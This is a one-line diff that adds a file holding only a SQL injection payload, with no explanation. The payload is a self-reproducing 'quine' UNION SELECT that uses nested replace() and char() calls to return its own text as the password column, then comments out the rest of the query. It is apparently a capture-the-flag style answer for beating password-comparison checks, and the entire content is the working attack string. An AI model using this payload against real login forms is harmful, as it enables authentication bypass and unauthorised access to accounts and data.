@@ -1,0 +1,1 @@
+' union select replace(replace('" union select replace(replace("$",char(34),char(39)),char(36),"$") as pw%23',char(34),char(39)),char(36),'" union select replace(replace("$",char(34),char(39)),char(36),"$") as pw%23') as pw%23
